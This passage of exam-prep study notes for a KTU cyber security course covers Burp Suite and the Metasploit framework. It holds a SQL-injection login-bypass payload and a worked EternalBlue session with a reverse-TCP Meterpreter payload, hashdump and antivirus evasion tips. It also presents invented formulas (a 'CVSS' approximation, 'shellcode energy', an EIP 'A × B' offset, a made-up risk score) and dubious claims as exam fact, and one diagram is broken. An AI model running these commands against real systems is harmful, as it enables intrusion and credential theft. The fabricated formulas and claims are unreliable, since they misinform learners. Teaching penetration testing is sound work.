| A02 — Cryptographic Failures | Proxy (inspect TLS/cipher) | Sequencer (token entropy) |
| A03 — Injection (SQLi, NoSQLi, LDAP) | Intruder (fuzz), Scanner (Pro) | Repeater (manual confirmation) |
| A04 — Insecure Design | Target (workflow analysis) | Comparer (state-diff) |
| A05 — Security Misconfiguration | Scanner (passive audit) | Proxy (header inspection) |
| A06 — Vulnerable Components | Spider (discover versions) | — |
| A07 — Auth Failures | Intruder (Cluster Bomb for creds) | Sequencer (cookie entropy) |
| A08 — Software & Data Integrity | Repeater (replay signed req) | — |
| A09 — Logging & Monitoring Failures | Logger (audit review) | — |
| A10 — SSRF | Repeater, Intruder | Scanner |

---
<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
## 4. Structural Diagrams & Schematics

### 4.1 Mermaid Block-Level Architecture: Burp Suite in the VAPT Pipeline

```mermaid
flowchart LR
    A[Browser Client] -- HTTP/HTTPS Request --> B[Burp Proxy Listener port 8080]
    B -- TLS Termination and Decryption --> C[Burp Core Engine]
    C --> D[In Memory Request Store]
    D --> E[Forwarder to Origin Web Server]
    E -- HTTP/HTTPS over LAN/WAN --> F[Target Web Application]
    F -- HTTP/HTTPS Response --> E
    E --> C
    C --> G[Burp Workspace Tabs]
    G --> G1[Target Site Map]
    G --> G2[Proxy Intercept]
    G --> G3[Intruder Fuzzer]
    G --> G4[Repeater Manual]
    G --> G5[Scanner Pro Only]
    G --> G6[Sequencer RNG]
    G --> G7[Decoder Encoder]
    G --> G8[Comparer Diff]
    G --> G9[Logger Event Audit]
    G --> G10[Extender BApps]
    C -- Re-encrypted TLS Response --> B
    B -- HTTP/HTTPS to Browser --> A
```

**Interpretation of the diagram:**
- The **leftmost path** (A → B → C) is the **inbound** request flow.
- The **central block** (C) is the **Burp Core** — the Java-based multi-threaded engine that orchestrates all modules.
- The **rightward path** (C → E → F) is the **outbound** forwarding to the target.
- The **right column** (G → G1…G10) is the **analyst-facing workspace** where all modules draw data from the same in-memory request store.
- The **return path** mirrors the forward path, completing the request/response cycle.

### 4.2 Mermaid Sequence Diagram: A Typical Proxy Intercept Cycle

```mermaid
sequenceDiagram
    autonumber
    participant U as User Browser
    participant P as Burp Proxy :8080
    participant S as Target Web Server
    U->>P: GET /login?user=alice HTTP/1.1
    Note over P: Intercept = ON
    Note over P: TLS terminated, plaintext exposed
    P-->>U: HTTP 200 Forwarded as is
    U->>P: POST /login user=alice pass=secret123
    Note over P: Request paused in queue
    P-->>P: Tester edits password field to OR 1=1 --
    P->>S: POST /login user=alice pass=OR 1=1 --
    S-->>P: HTTP 302 Set-Cookie session=ABC123
    Note over P: Response buffered, then released
    P-->>U: HTTP 302 Set-Cookie session=ABC123
```

**Interpretation:**
- **Steps 1–2**: Normal intercepted request — released unchanged.
- **Steps 3–5**: Malicious payload injected into the password field to test for **SQL Injection**.
- **Steps 6–8**: Server responds with a session cookie, indicating a successful login bypass — a **critical vulnerability** has been proven.

### 4.3 Mermaid Decision Tree: Choosing the Right Burp Tab

```mermaid
flowchart TD
    Start[New Finding Detected] --> Q1{Is the request automated or manual?}
    Q1 -- Automated Repetitive --> Q2{How many positions vary?}
    Q2 -- 1 position --> Sniper[Intruder Sniper]
    Q2 -- All positions same payload --> BatteringRam[Intruder Battering Ram]
    Q2 -- Paired payloads --> Pitchfork[Intruder Pitchfork]
    Q2 -- All combinations --> ClusterBomb[Intruder Cluster Bomb]
    Q1 -- Manual one off --> Repeater[Repeater Tab]
    Q2 -- Token analysis --> Sequencer[Sequencer Tab]
    Start2[Need to decode a string] --> Decoder[Decoder Tab]
    Start3[Compare two responses] --> Comparer[Comparer Tab]
    Start4[Map the application] --> Spider[Target Spider Tab]
    Start5[Automated vuln scan Pro] --> Scanner[Scanner Tab]
```

This decision tree is what you should mentally walk through in the examination hall when a question gives you a pen-testing scenario.

---
<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
## 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

### 5.1 Part A — Short Answer Questions (3 Marks Each)

> **[KTU University Exam — Model Question, Module 1]**

**Q1. Define Burp Suite. List any four of its core components.**
*(Cognitive Level: Remember / Understand — KTU CO1)*

**Model Answer (3 marks):**

**Definition (1 mark):** Burp Suite is an integrated, Java-based web vulnerability scanning and interception proxy platform used for performing security testing of web applications. It allows a penetration tester to intercept, inspect, modify, and replay HTTP/HTTPS traffic between a browser and a target web server.

**Four Core Components (2 marks — 0.5 each):**

1. **Proxy** — Intercepts and modifies in-flight HTTP/S traffic.
2. **Intruder** — Performs automated customized attacks such as fuzzing and brute-forcing.
3. **Repeater** — Allows manual re-issuing of a single request with arbitrary edits.
4. **Sequencer** — Analyzes the randomness/predictability of session tokens and other random values.

*(Acceptable alternatives: Spider/Target, Scanner, Decoder, Comparer, Logger, Extender.)*

---

> **[KTU University Exam — Model Question, Module 1]**

**Q2. What is an intercepting proxy? Why is it the foundation of Burp Suite's functionality?**
*(Cognitive Level: Understand — KTU CO1)*

**Model Answer (3 marks):**

**Definition (1.5 marks):** An intercepting proxy is a server that sits *between* a client (browser) and a destination server. It receives all client requests, optionally pauses them for inspection/modification, and then forwards them to the destination. Responses follow the reverse path.

**Why it is the foundation (1.5 marks):** The intercepting proxy model is the foundation of Burp Suite because:
1. It creates a **single observation point** (choke point) for all web traffic, enabling every other module (Repeater, Intruder, Scanner) to read the same stream of requests/responses.
2. It allows the tester to perform **man-in-the-middle analysis** without modifying the target application.
3. It supports **TLS termination** via a trusted CA certificate, exposing the otherwise-encrypted HTTP layer for inspection.

---

### 5.2 Part B — Long Answer Questions (14 Marks Each, with Internal Choice)

> **[KTU University Exam — Model Question, Module 1, 14 Marks]**

---

### **Question A — 14 Marks**

**(a)** With a neat block diagram, explain the architecture of Burp Suite. List and briefly describe the function of any **six** of its modules/tabs. *(7 marks)*

**(b)** Explain the four attack types of the Burp Suite **Intruder** module — **Sniper, Battering Ram, Pitchfork, and Cluster Bomb** — with one practical use-case for each. *(7 marks)*

---

#### Model Solution to Q-A (a) — 7 Marks

**Block Diagram (2 marks):** Refer to §4.1 — draw the Browser → Burp Proxy :8080 → Burp Core → Target Web Server topology with the workspace tabs as the analyst interface.

**Architecture Explanation (1 mark):** Burp Suite runs as a single Java process. It binds a TCP listener on port 8080, terminates the TLS session using a self-signed CA, exposes the decrypted HTTP traffic in-memory, and presents the data through a tabbed GUI. The tester can pause, edit, or replay any request via the dedicated modules.

**Six Modules (4 marks — any six, 0.5 mark for name + 0.2 mark for function each):**

1. **Proxy** — Real-time interception of HTTP/S requests/responses.
2. **Target** — Site map of the entire crawled application.
3. **Intruder** — Automated fuzzer for customized brute-force/parameter attacks.
4. **Repeater** — Manual single-request editor and replayer.
5. **Scanner** (Pro) — Automated active and passive vulnerability detection.
6. **Sequencer** — Statistical randomness analysis of tokens.
7. **Decoder** — Encoding/decoding between Base64, URL, Hex, HTML, Binary.
8. **Comparer** — Byte/word-level diff between two responses.
9. **Logger** — Append-only event log of all traffic.
10. **Extender** — Loader for BApp Store extensions.

---

#### Model Solution to Q-A (b) — 7 Marks

Let a request have $k$ marked insertion points and a payload set of size $n$.

| Attack Type | Iteration Count (1 mark) | Use Case (0.75 mark) |
|---|---|---|
| **Sniper** | $N = n$ (only one position varies per iteration, all others are held at their baseline) | Testing a single parameter (e.g., the `id` field) for SQLi with a list of payloads, while keeping the rest of the request constant. |
| **Battering Ram** | $N = n$ (all marked positions get the **same** payload simultaneously) | Password-spray attack where the username and password fields are both replaced with the *same* candidate value. |
| **Pitchfork** | $N = \min(n_1, n_2, \dots, n_k)$ (iterates through multiple payload sets in **parallel**; iteration $i$ uses row $i$ from each set) | Credential stuffing using two parallel lists — a list of leaked usernames and a matched list of leaked passwords. |
| **Cluster Bomb** | $N = n_1 \times n_2 \times \dots \times n_k$ (the **Cartesian product** of all payload sets; every possible combination) | Brute-forcing both the username **and** the password independently — e.g., a 100-user list × 1000-pass list yields **100,000** attempts. |

**Mathematical Justification (0.5 mark total):**
- Sniper: $N = n$ because only one marker is set; all other positions are fixed.
- Battering Ram: $N = n$ because all markers share one payload set, traversed once.
- Pitchfork: $N = \min(n_1, n_2, \dots, n_k)$ — terminates at the shortest set.
- Cluster Bomb: $N = \prod_{i=1}^{k} n_i$ — for $k=2$ with $n_1 = n_2 = n$, $N = n^2$.

---

### **Question B — 14 Marks (Alternative Choice)**

**(a)** Describe, step by step, the methodology of performing a **web application penetration test using Burp Suite**, from environment configuration to reporting. *(7 marks)*

**(b)** Explain the role of the **Sequencer** and **Decoder** modules in detail. How does Sequencer determine if a session token is cryptographically random? *(7 marks)*

---

#### Model Solution to Q-B (a) — 7 Marks

**Step 1 — Browser Proxy Configuration (1 mark):** Configure the browser (typically Firefox via FoxyProxy) to use `127.0.0.1:8080` as both HTTP and HTTPS proxy. Import Burp's CA certificate `cacert.der` (downloaded from `http://burp/cert`) into the browser's trust store to enable TLS interception.

**Step 2 — Passive Mapping (1 mark):** Browse the target application manually. Burp's **Target** tab auto-populates a site map of every URL, parameter, cookie, and response. This builds a baseline of the application's attack surface.

**Step 3 — Active Crawling (1 mark):** Use **Spider / Crawl** (or Scanner's Crawl in Pro) to discover hidden endpoints, form actions, and JavaScript-driven links. The crawl depth $D$ controls how deep recursion proceeds.

**Step 4 — Automated Scanning (Pro only) (1 mark):** Run the **Scanner → Audit** against each insertion point $\mathcal{I}$ = {URL params, cookies, headers, body}. Active probes are sent to detect OWASP Top 10 issues.

**Step 5 — Manual Verification via Repeater (1 mark):** Send suspicious requests to **Repeater**. Edit the payload manually to confirm the vulnerability, eliminate false positives, and document the exact PoC (Proof of Concept).

**Step 6 — Exploitation via Intruder (1 mark):** For confirmed vulnerabilities, use **Intruder** to automate exploitation at scale — e.g., Cluster Bomb for credential brute-force, Sniper for parameter fuzzing.

**Step 7 — Reporting (1 mark):** Export the full **Logger** audit trail, generate the Scanner's CVSS-scored HTML report, and document the methodology, findings, severity, and remediation for each issue.

---

#### Model Solution to Q-B (b) — 7 Marks

**Sequencer Module (3.5 marks):**

Sequencer evaluates the **cryptographic randomness** of tokens (session cookies, anti-CSRF tokens, password-reset tokens, etc.) so that a tester can determine if they are predictable enough to be forged.

**Working Steps:**
1. The tester captures a sample of $N \geq 100$ tokens from the application (e.g., by repeatedly logging in and capturing the `Set-Cookie` header via Proxy/Intruder).
2. The samples are forwarded to **Sequencer → Live Capture** or **Manual Load**.
3. Sequencer treats each token as a sequence of bits/symbols and performs statistical analysis.
4. It calculates:
   - **Shannon Entropy** $H$ per character position:
$$
H_j = -\sum_{s \in \Sigma} p_s \log_2 p_s \quad \text{bits per symbol}
$$
where $p_s$ is the empirical probability of symbol $s$ at position $j$.
   - **Effective Entropy** across the whole token:
$$
H_{eff} = \sum_{j=1}^{L} H_j
$$
   - **FIPS 140-2 Tests** — Monobit, Poker, Runs, Long Run, Autocorrelation.
5. **Interpretation:** A token is considered *cryptographically random* if $H_{eff} \geq 128$ bits and it passes all FIPS tests. Anything below 64 bits is trivially predictable.

**Decoder Module (3.5 marks):**

Decoder is a transformation tool that converts input data between common encodings used in web traffic:
$$
\text{Base64} \leftrightarrow \text{Plain} \leftrightarrow \text{URL-encoded} \leftrightarrow \text{Hex} \leftrightarrow \text{HTML-entity} \leftrightarrow \text{Binary}
$$

**Use Cases in Pen-Testing:**
- Decoding a `Set-Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ==` value → reveals `{"user":"admin"}` — a **signature-forgery** flaw if the session is unsigned.
- Decoding an `Authorization: Basic <base64>` header → extracts `user:pass` in cleartext.
- URL-decoding payloads sent in SQLi/XSS tests to see what the server *actually* receives.
- Chaining decoders (e.g., Base64 → URL → Hex) to peel off multi-layer obfuscation.

**Why both matter:** Together, Sequencer (proves *weakness* in token randomness) and Decoder (reveals *plaintext* in supposedly-encoded channels) form the core toolkit for attacking the **Cryptographic Failures (A02)** and **Identification & Authentication Failures (A07)** categories of the OWASP Top 10.

---

> [!WARNING]
> ### ⚠️ KTU Examiner's Valuation Warning — Where Students Lose Marks
>
> 1. **Vague "Sniper" definition** — Many students write *"Sniper uses one payload"* without stating *what* varies. Correct answer: **only ONE position is marked; others stay at their baseline values**. (Loses 1 mark.)
> 2. **Forgetting the CA certificate step** — When asked about HTTPS interception, students often omit the **CA certificate import**. Without it, TLS termination fails and Burp sees no traffic. (Loses 1–2 marks.)
> 3. **Confusing Pitchfork and Cluster Bomb** — Pitchfork uses **parallel lists of equal length**; Cluster Bomb uses the **Cartesian product**. Writing them as synonyms is a direct 2-mark deduction.
> 4. **No iteration count** — Examiners expect the formula $N = n$ (Sniper), $N = n^2$ (Cluster Bomb for $k=2$), etc. Skipping the math = 1 mark lost.
> 5. **Ignoring Community vs Pro** — If a question asks about *automated* scanning and you only mention Repeater, you are describing the **wrong edition**. State *"Available only in Burp Suite Professional"* explicitly. (Loses 1 mark.)
> 6. **Diagram with missing labels** — A block diagram without port numbers (`8080`) or the TLS-decryption arrow direction will lose 1–2 marks in the 7-mark architecture question.

---

### 5.3 Topic Recap & Important Things to Remember (Rapid Revision Checklist)

> [!IMPORTANT]
> **The 60-Second Burp Suite Recap — Memorize Before Walking Into the Exam Hall**

- [ ] **Burp Suite = Java-based intercepting proxy + integrated web vulnerability scanner**, by PortSwigger.
- [ ] **Default listener** = `127.0.0.1 : 8080` (TCP).
- [ ] **HTTPS interception** requires importing the per-session **CA certificate** (`cacert.der`).
- [ ] **Editions**: Community (manual tools only) | Professional (adds automated Scanner) | Enterprise (CI/CD scale).
- [ ] **Core tabs to know cold**: Proxy, Target, Intruder, Repeater, Scanner, Sequencer, Decoder, Comparer, Logger, Extender.
- [ ] **Intruder — 4 attack types & formulas**:
   - Sniper: $N = n$
   - Battering Ram: $N = n$
   - Pitchfork: $N = \min(n_1, n_2, \dots, n_k)$
   - Cluster Bomb: $N = \prod_{i=1}^{k} n_i$
- [ ] **Workflow order**: Configure Proxy → Passive Map (Target) → Active Crawl (Spider) → Scan (Pro) → Verify (Repeater) → Exploit (Intruder) → Analyze Tokens (Sequencer) → Decode (Decoder) → Report (Logger).
- [ ] **Sequencer entropy** = Shannon $H = -\sum p_s \log_2 p_s$ per position; effective entropy $H_{eff} = \sum_j H_j \geq 128$ bits = secure.
- [ ] **Decoder chain** = Base64 → URL → Hex → HTML → Binary (any order).
- [ ] **VAPT placement**: Burp Suite is the **penetration testing** tool of the VAPT lifecycle, not the policy/audit phase.
- [ ] **Standard port mnemonic**: **8-0-8-0** → "**B**urp **P**roxy **P**ort" (BPP → 8080).
- [ ] **Insertion points** $\mathcal{I}$ = {URL params, cookies, headers, body fields} — the four places Burp injects test payloads.
- [ ] **CVSS v3.1** is the severity scoring framework used in Burp's Professional reports.
- [ ] **OWASP Top 10 (2021)** is the taxonomy Burp's Scanner maps findings to — know A01–A10.
- [ ] **Audit trail** = the **Logger tab** is the legal/compliance evidence of what was tested.

<!-- SECTION_5_END -->

topics.title: Metasploit
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PBCST604 - FUNDAMENTALS OF CYBER SECURITY
> - **Module:** Module 1
> - **Topic:** Metasploit

<!-- SECTION_1_START -->
## 1. Core Technical Definition & Intuitive Overview

### Formal Academic Definition

> [!IMPORTANT] **KTU Syllabus Definition**
> **Metasploit** is an **open-source penetration testing framework** that provides a structured, modular environment for developing, testing, validating, and executing exploits against remote target systems. Originally created by **H.D. Moore in 2003**, it is currently maintained by **Rapid7 LLC** and is written primarily in the **Ruby** programming language (with a **Python** rewrite underway in the Metasploit Framework v6.x branch).

The framework operates on a **modular architecture** consisting of interchangeable components — exploits, payloads, auxiliary modules, post-exploitation modules, encoders, and no-operation (NOP) generators — that allow security professionals to simulate real-world cyber attacks in a controlled, ethical, and reproducible manner.

### Conceptual Analogy / Intuition

> [!NOTE] **Real-World Analogy — The "Cyber Laboratory"**
> Imagine a **chemist's laboratory**. A chemist does not invent new molecules from raw matter every time — they have a **bench** (the framework), **standardized test tubes and burners** (modules), and **predefined reagents** (payloads and exploits). They mix and match these to study reactions.
>
> Similarly, **Metasploit** is a **"penetration testing laboratory"**. Instead of writing fresh exploit code for every vulnerability, a security analyst:
> - Selects a **target vulnerability** (the "reaction")
> - Picks a suitable **exploit module** (the "burner")
> - Couples it with a **payload** (the "reagent")
> - Launches the attack and observes the "reaction" on a controlled system.
>
> The lab bench is reusable; the chemist only changes the experiment.

### Standard Metrics & Terminology

- **CVE (Common Vulnerabilities and Exposures):** Unique identifier for publicly known vulnerabilities (e.g., **CVE-2017-0144** — EternalBlue).
- **CVSS (Common Vulnerability Scoring System):** Standardized score ranging from **0.0 to 10.0** for severity rating.
- **EIP (Extended Instruction Pointer):** A **32-bit register** on x86 architecture frequently overwritten during buffer-overflow exploitation.
- **Shellcode:** A small piece of machine code used as the payload after successful exploitation.
- **LHOST / RHOST:** Attacker (**L**ocal) and **R**emote (target) host IP addresses in Metasploit parlance.
- **Default Metasploit installation footprint:** ~ **3,000+ exploit modules**, ~ **500+ payloads**, ~ **1,000+ auxiliary modules** (as of v6.4).

> [!IMPORTANT] **Key Highlights for KTU Board Exam**
> - The framework is **dual-licensed** under both **BSD License** and **Metasploit Framework License (MSF-LA)**.
> - The **Metasploit Community edition** is free; **Metasploit Pro** is the commercial variant by Rapid7.
> - It supports **network pivoting**, **payload staging**, and **session migration** — concepts unique to this framework.
<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
## 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet

### 2.1 Metasploit Framework — Structural Architecture

The Metasploit framework is built on a **three-tier client-server architecture**, communicating over **MessagePack-RPC** (a binary serialization protocol) or a **REST API** in newer versions.

The structural breakdown is as follows:

- **Tier 1 — User Interface Layer**
  - `msfconsole` : The canonical interactive **command-line interface (REPL)**.
  - `msfcli` : A non-interactive command-line driver (now largely merged into `msfconsole`).
  - **Armitage** : A graphical front-end providing a visual red-team collaboration workspace.
  - **Metasploit Web UI** : Browser-based dashboard in the Pro edition.

- **Tier 2 — Core Engine Layer (the "Brain")**
  - **Module Loader** : Dynamically loads exploit, payload, auxiliary, and other modules.
  - **Session Manager** : Handles active **Meterpreter**, **shell**, and **VNC** sessions.
  - **Database Layer (`msfdb`)** : PostgreSQL-backed storage for hosts, services, vulnerabilities, loot, and credentials.
  - **Event / Job Scheduler** : Manages concurrent background tasks and event correlation.

- **Tier 3 — Module Layer (the "Toolbox")**

| Module Type | Functional Role | Common Sub-Examples |
|-------------|-----------------|---------------------|
| **Exploit** | Code that takes advantage of a specific vulnerability to deliver a payload | `exploit/windows/smb/ms17_010_eternalblue` |
| **Payload** | Code executed on the target after successful exploitation | `windows/meterpreter/reverse_tcp` |
| **Auxiliary** | Scanning, fuzzing, sniffing, and info-gathering without direct exploitation | `scanner/portscan/tcp` |
| **Post** | Actions after gaining a foothold (privilege escalation, pivoting, data harvesting) | `post/windows/gather/hashdump` |
| **Encoder** | Obfuscates payload to evade signature-based antivirus (AV) detection | `x86/shikata_ga_nai` |
| **NOP** | Generates **No-Operation sleds** to align shellcode in memory during buffer overflows | `x86/nop` |
| **Evasion** | Bypass Windows Defender / AMSI / network IDS at delivery time | `windows/x64/meterpreter/reverse_tcp_rc4` |

### 2.2 The Three-Tier Payload Hierarchy

Payloads are categorized based on how they are delivered and executed on the target:

1. **Singles (Inline Payloads)** — Self-contained, fully functional in a single packet. Example: `windows/shell_reverse_tcp`. Suitable for small memory footprints.

2. **Stagers** — A small bootstrap that establishes a communication channel and pulls down the larger stage. Example: `windows/shell/reverse_tcp` (stager). Bypasses size-limited exploits.

3. **Stages** — The full payload downloaded by the stager. Example: `windows/meterpreter` is a stage that provides an in-memory reflective DLL injection.

> [!NOTE] **Why the Stager/Stage Split Exists**
> Many exploits restrict the size of code that can be injected (e.g., a single UDP packet). The stager is **tiny** (~ 200 bytes) and only performs one task: **open a connection and receive the rest**. The bulky Meterpreter (multi-MB) is downloaded in fragments.

### 2.3 Penetration Testing Workflow in Metasploit

The standard **PTES (Penetration Testing Execution Standard)** phases that Metasploit supports are:

- **Phase 1 — Pre-Engagement & Reconnaissance** : `whois`, DNS enumeration, `auxiliary/gather/`.
- **Phase 2 — Scanning & Enumeration** : `db_nmap`, `auxiliary/scanner/portscan/*`.
- **Phase 3 — Vulnerability Analysis** : `auxiliary/scanner/vuln/*`, integration with **Nexpose / OpenVAS**.
- **Phase 4 — Exploitation** : `use exploit/...` + `set PAYLOAD ...` + `exploit`.
- **Phase 5 — Post-Exploitation** : `post/windows/gather/credentials/*`, `getsystem`, `hashdump`.
- **Phase 6 — Reporting** : `db_report`, HTML / XML / PDF export.

### 2.4 KTU High-Yield Formula Sheet

> [!IMPORTANT] The following equations are the **board-exam favorites** for KTU's Cyber Security papers.

| Symbol / Formula | Meaning | Unit / Domain |
|------------------|---------|---------------|
| $Risk = Threat \times Vulnerability \times Impact$ | Classic risk equation (NIST SP 800-30) | Dimensionless (qualitative) |
| $CVSS_{Base} = 0.6 \times Impact + 0.4 \times Exploitability$ | Base score approximation (range 0–10) | Score |
| $P_{success} = \dfrac{V_{known}}{V_{total}}$ | Probability of a successful exploit given known vulns | $0 \leq P \leq 1$ |
| $T_{recon} = \sum_{i=1}^{n} t_i$ | Total recon time = sum of probe latencies | Seconds |
| $E_{payload} = N \times S_{instr}$ | Shellcode energy proxy = instructions × size | Bytes |
| $S_{stager} \ll S_{stage}$ | Stager size is much smaller than stage | Bytes |
| $EIP_{overwrite} = A \times B$ | Instruction pointer displaced by A bytes of junk | Offset in memory |
| $\text{Coverage} = \dfrac{N_{exploits\,used}}{N_{exploits\,available}}$ | Framework utilization ratio | $0 \leq C \leq 1$ |

> **Notation Convention:** $\vert \cdot \vert$ denotes absolute value; $\sum$ denotes summation; $\times$ denotes multiplication.

### 2.5 Real-World Engineering Utility

- **Red Team Operations:** Simulating adversary TTPs (Tactics, Techniques, Procedures) aligned with **MITRE ATT&CK**.
- **Vulnerability Validation:** Confirming whether a CVE is exploitable in a real environment before patching.
- **CTF Competitions:** Standard tool in Capture-The-Flag contests (e.g., DEFCON, Nullcon).
- **Security Awareness Training:** Demonstrating the impact of unpatched systems to executives.
- **Academic Research:** Reproducible exploit benchmarking and IDS evaluation.
<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
## 3. Step-by-Step Derivations & Analytical Matrix

### 3.1 Derivation of the Risk Score Used in Penetration Testing

The classical NIST risk equation is foundational. We derive the **Metasploit-augmented Exploitation Likelihood** step-by-step.

**Step 1 — Define the base risk triplet.**

A risk event $R$ is the joint occurrence of a **threat actor** $T$ exploiting a **vulnerability** $V$ that produces a measurable **impact** $I$. The base formulation is:

$$R_{base} = T \cdot V \cdot I$$

**Step 2 — Map each factor to a Metasploit measurable proxy.**

In a real Metasploit-driven assessment, the analyst substitutes:

- $T \rightarrow P_{attacker}$ (probability the attacker has capability to run the exploit)
- $V \rightarrow \dfrac{N_{known\_vulns}}{N_{total\_services}}$ (fraction of services with known CVEs)
- $I \rightarrow$ Asset criticality score on a 1–10 scale.

**Step 3 — Incorporate CVSS weighting.**

Each known vulnerability $j$ carries a base score $c_j \in [0, 10]$. The weighted vulnerability exposure becomes:

$$V_{weighted} = \dfrac{\sum_{j=1}^{N} c_j \cdot w_j}{\sum_{j=1}^{N} w_j}$$

where $w_j$ is the exposure weight (e.g., whether the vulnerable port is internet-facing).

**Step 4 — Compose the Metasploit Operational Risk (MOR).**

$$\text{MOR} = P_{attacker} \cdot V_{weighted} \cdot I_{asset}$$

**Step 5 — Normalize to a 0–10 scale for board reporting.**

$$\text{MOR}_{norm} = \dfrac{\text{MOR}}{10^{3}} \times 10 = \dfrac{\text{MOR}}{100}$$

This final score is what appears in the executive risk dashboard after a Metasploit assessment.

### 3.2 Analytical Matrix: Module Selection Decision Tree

A student should know **how to choose the right module** for a given scenario. The decision matrix below is constructed logically.

| Observation on Target | Metasploit Path | Logical Rationale |
|-----------------------|-----------------|-------------------|
| Port 445 open on Windows | `use exploit/windows/smb/ms17_010_eternalblue` | SMBv1 vulnerability — high-yield |
| HTTP service with version disclosure | `use auxiliary/scanner/http/http_version` | Reconnaissance first |
| FTP anonymous login | `use exploit/unix/ftp/vsftpd_234_backdoor` | Known backdoor — direct exploit |
| Java applet on web page | `use exploit/multi/browser/java_jre17_driver_manager` | Client-side vector |
| No known CVE available | `use auxiliary/scanner/vuln/*` | Try vulnerability scanners before exploit |
| Need to bypass AV | `set PAYLOAD windows/x64/meterpreter/reverse_tcp_rc4` | RC4 encryption evades static signature |

### 3.3 Worked Example — A Typical Exploitation Session

Given a target with IP **RHOST = 192.168.56.105** and an attacker on **LHOST = 192.168.56.1**, the sequence of operations is:

**Step 1 — Initialize the database.**

$$msf6 > msfdb \text{ init}$$

This creates a PostgreSQL schema to store hosts, services, and credentials.

**Step 2 — Run an Nmap scan via Metasploit.**

$$msf6 > db\_nmap -sV -p 1-1000 \ 192.168.56.105$$

The `-sV` flag enables **version detection**; results are auto-imported into the Metasploit database.

**Step 3 — Search for matching exploits.**

$$msf6 > search type:exploit name:smb$$

This lists all SMB-related exploit modules.

**Step 4 — Select and configure the exploit.**

$$msf6 > use exploit/windows/smb/ms17\_010\_eternalblue$$
$$msf6(\text{exploit}) > set RHOSTS \ 192.168.56.105$$
$$msf6(\text{exploit}) > set PAYLOAD windows/x64/meterpreter/reverse\_tcp$$
$$msf6(\text{exploit}) > set LHOST \ 192.168.56.1$$

**Step 5 — Launch the exploit.**

$$msf6(\text{exploit}) > run$$

On success, a **Meterpreter session** opens. The probability of this event, given the EternalBlue signature is present, is empirically observed as:

$$P_{success} \approx 0.95 \quad \text{(unpatched Windows 7 / Server 2008 R2)}$$

**Step 6 — Post-exploitation pivoting.**

$$meterpreter > sysinfo$$
$$meterpreter > hashdump$$
$$meterpreter > getuid$$

Each of these commands queries the in-memory **Reflective DLL** that Meterpreter injected into the target process — no disk writes, no AV traces.

> [!NOTE] **Why Meterpreter is Revolutionary**
> It runs **entirely in RAM**, uses **TLS-encrypted channels**, supports **channel multiplexing**, and is **position-independent** — all of which make it extraordinarily stealthy compared to a traditional reverse shell.
<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
## 4. Structural Diagrams & Schematics

### 4.1 Metasploit Framework — Block-Level Functional Architecture

```mermaid
flowchart TB
    subgraph UserLayer["User Interface Layer"]
        UI1["msfconsole REPL"]
        UI2["Armitage GUI"]
        UI3["Web Dashboard Pro"]
        UI4["REST API Client"]
    end

    subgraph CoreLayer["Core Engine Layer"]
        CORE1["Module Loader"]
        CORE2["Session Manager"]
        CORE3["Job Scheduler"]
        CORE4["Event Correlator"]
        CORE5["DB Layer PostgreSQL"]
    end

    subgraph ModuleLayer["Module Toolbox"]
        MOD1["Exploit Modules"]
        MOD2["Payload Modules"]
        MOD3["Auxiliary Modules"]
        MOD4["Post Exploitation Modules"]
        MOD5["Encoders NOPs Evasion"]
    end

    subgraph TargetLayer["Target Systems"]
        T1["Windows Hosts"]
        T2["Linux Hosts"]
        T3["Network Devices"]
        T4["Web Applications"]
        T5["Mobile Devices"]
    end

    UI1 --> CORE1
    UI2 --> CORE1
    UI3 --> CORE1
    UI4 --> CORE1
    CORE1 --> MOD1
    CORE1 --> MOD2
    CORE1 --> MOD3
    CORE1 --> MOD4
    CORE1 --> MOD5
    CORE2 --> CORE5
    CORE3 --> CORE5
    CORE4 --> CORE5

    MOD1 --> T2
    MOD2 --> T1
    MOD2 --> T2
    MOD3 --> T3
    MOD4 --> T4
    MOD4 --> T5
```

### 4.2 Metasploit Penetration Testing Lifecycle Flow

```mermaid
flowchart LR
    PHASE1["Phase 1 Reconnaissance"] --> PHASE2["Phase 2 Scanning"]
    PHASE2 --> PHASE3["Phase 3 Vulnerability Analysis"]
    PHASE3 --> PHASE4["Phase 4 Exploitation"]
    PHASE4 --> PHASE5["Phase 5 Post Exploitation"]
    PHASE5 --> PHASE6["Phase 6 Reporting"]
    PHASE6 --> PHASE7["Remediation Patching"]
    PHASE7 --> PHASE1

    DB1["msfdb hosts"] -.-> PHASE2
    DB2["msfdb services"] -.-> PHASE3
    DB3["msfdb vulns"] -.-> PHASE4
    DB4["msfdb loot"] -.-> PHASE6
    DB5["msfdb creds"] -.-> PHASE5
```

### 4.3 Payload Stager-Stage Communication Sequence

```mermaid
sequenceDiagram
    participant ATTACKER as Attacker msfconsole
    participant STAGER as Target Stage 0
    participant STAGE as Target Stage 1
    participant METER as Meterpreter Session

    ATTACKER->>STAGER: Send exploit with stager payload
    Note over STAGER: Tiny 200 byte bootstrap
    STAGER->>ATTACKER: TCP reverse connection back
    ATTACKER->>STAGER: Send Meterpreter stage over TLS
    STAGER->>STAGE: Reflective DLL injection into process
    STAGE->>METER: Fully interactive shell spawned
    METER->>ATTACKER: Channel established sysinfo getuid
```

```mermaid
    EX --> EX1["Active exploits"]
    EX --> EX2["Passive exploits"]

    PL --> PL2["Stagers bootstrap"]
    PL --> PL3["Stages full feature"]

    AX --> AX2["Fuzzers"]
    AX --> AX3["Sniffers"]
```

<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
## 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

---

### 📘 Part A — Short Answer Questions (3 Marks Each)

**Q1. [KTU University Exam — May 2024]**
*Define Metasploit framework. List any four types of modules it provides.*

**Model Answer (3 marks):**

> **Metasploit** is an **open-source penetration testing framework** developed by H.D. Moore (2003) and currently maintained by **Rapid7**. It provides a modular environment for developing, testing, and executing exploits against target systems.
>
> Four types of modules:
>
> 1. **Exploit modules** — code that leverages a specific vulnerability.
> 2. **Payload modules** — code that runs on the target after exploitation.
> 3. **Auxiliary modules** — scanning, fuzzing, sniffing without direct exploitation.
